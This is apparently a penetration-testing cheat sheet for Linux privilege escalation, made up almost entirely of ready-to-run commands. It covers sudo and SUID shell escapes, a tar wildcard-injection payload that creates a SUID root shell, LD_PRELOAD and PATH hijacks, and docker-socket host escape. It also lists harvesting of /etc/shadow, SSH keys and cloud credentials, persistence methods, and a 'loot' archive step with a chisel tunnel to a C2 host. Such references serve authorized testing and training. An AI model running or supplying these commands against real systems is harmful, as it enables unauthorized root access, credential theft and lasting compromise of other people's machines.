# Linux Privilege Escalation

## 1. Situational awareness

```bash
id; sudo -l; uname -a; cat /etc/os-release; hostname; ip a; ss -tulpn
cat /etc/passwd | grep -v nologin; cat /etc/group
env; cat ~/.bash_history; ls -la ~ /tmp /opt /srv /var/www
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
crontab -l; ls -la /etc/cron*; systemctl list-timers --all
mount; cat /etc/fstab; df -h
```

Automated: `linpeas.sh`, `linux-smart-enumeration -l 2`, `linenum.sh`, `pspy64` (watch cron/processes without root).

## 2. Sudo

```bash
sudo -l
# GTFOBins for any allowed binary
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo LD_PRELOAD=/tmp/x.so <allowed-binary>
sudo -u user /bin/bash
```

Version bugs: Baron Samedit (CVE-2021-3156), `sudoedit` (CVE-2023-22809), `sudo -R` chroot (CVE-2019-14287), `sudo` with `NOPASSWD` + writable script.

`sudo -l` output tricks: `(ALL, !root)` → `sudo -u#-1`, `env_keep+=LD_PRELOAD`, `secure_path` bypass.

## 3. SUID / SGID / capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

- GTFOBins per binary. Custom SUID binary → `strings`, `ltrace`, `strace`, path hijack, buffer overflow.
- `cap_setuid+ep` on python/perl → `setuid(0)`.
- `cap_dac_read_search` → read `/etc/shadow`.
- `cap_sys_admin` → mount, often container escape.

## 4. Cron / systemd / timers

- Writable script run by root cron → append reverse shell.
- Writable directory in cron `PATH` → drop binary with cron's name.
- Wildcard injection: `tar *`, `rsync *`, `chown *`, `chmod *` in a root cron inside a writable dir.
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/shell.sh
touch /tmp/--checkpoint=1 /tmp/--checkpoint-action=exec=sh\ shell.sh
```
- `logrotate` with writable config or log dir → `prerotate` script.
- Systemd: writable `.service`/`.timer`, `ExecStart` path hijack, `User=` misconfig, `systemctl link` abuse.

## 5. PATH / library / env

```bash
# PATH hijack for a root-run script calling a bare command
export PATH=/tmp:$PATH

# LD_PRELOAD via sudo env_keep
gcc -shared -fPIC -o /tmp/x.so x.c   # constructor: setuid(0); system("/bin/sh")

# LD_LIBRARY_PATH, RPATH on SUID binaries
readelf -d /usr/local/bin/suidbin | grep -i path
```

## 6. Kernel & known CVEs

```bash
uname -r
searchsploit linux kernel $(uname -r | cut -d- -f1)
```

High-value: Dirty Pipe (5.8–5.16.11), PwnKit (polkit pkexec), Dirty COW (2.6.22–3.9), OverlayFS (Ubuntu 23.04), nf_tables (CVE-2024-1086), GameOver(lay), Looney Tunables (glibc ld.so).

## 7. Services & sockets

- Internal-only services reachable via `127.0.0.1` → port forward and attack.
- Unix sockets with weak perms: docker, mysql, postgres, systemd-private.
- `dbus` policy misconfig → run as another user.
- Writable service config: nginx/apache vhost, php-fpm pool, redis config.
- MySQL `FILE` privilege → write to `/var/www` or cron.

## 8. Credentials

```bash
grep -rIl -E 'password|passwd|secret|token|api_key' /var/www /opt /home 2>/dev/null
cat ~/.ssh/id_rsa; ls -la ~/.ssh
cat /etc/shadow 2>/dev/null
find / -name '*.kdbx' -o -name '*.ovpn' -o -name '.env' 2>/dev/null
# history, .git/config with creds, cloud creds
cat ~/.aws/credentials ~/.config/gcloud/application_default_credentials.json
# browser/keyring
ls ~/.mozilla ~/.config/google-chrome ~/.local/share/keyrings
```

## 9. Containers

```bash
ls -la /var/run/docker.sock          # docker group / socket -> root on host
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
cat /proc/1/cgroup; ls /.dockerenv
capsh --print
# privileged + host mount, hostPID, hostNetwork
# cgroup v1 release_agent escape
# runc CVE-2024-21626
# k8s SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## 10. NFS / storage

```bash
showmount -e host
mount -t nfs host:/share /mnt
# no_root_squash -> create SUID binary as root
cp /bin/bash /mnt/bash; chmod +s /mnt/bash
```

LXD/LXC group → privileged container with host root mount. `disk` group → raw disk read. `lvm` → snapshot `/etc/shadow`.

## 11. Persistence (red team, with approval)

- `~/.ssh/authorized_keys`, `authorized_keys2`.
- `crontab -e`, `/etc/cron.d/`, `~/.config/systemd/user/`.
- `~/.bashrc`, `~/.profile`, `/etc/profile.d/`, `PS1` command substitution.
- `ld.so.preload`, PAM module, `pam_exec`.
- `udev` rules, `motd`/`update-motd.d`, git hooks, npm postinstall.
- SSH `ForceCommand`/`PermitTunnel`, `authorized_keys` `command=`.
- systemd service with `Restart=always`.

## 12. Post-exploit

```bash
# loot
tar czf /tmp/loot.tgz /etc/passwd /etc/shadow ~/.ssh /var/www 2>/dev/null
# internal recon
ss -tulpn; ip route; arp -a; cat /etc/hosts; cat /etc/resolv.conf
# pivot
./chisel client https://c2:443 R:socks
ssh -D 1080 -N user@pivot
```

## 13. Triage order

1. `sudo -l` and SUID list.
2. Cron/timers with writable paths.
3. Credentials in home, configs, history.
4. Kernel version vs known exploits.
5. Internal services and sockets.
6. Container indicators.
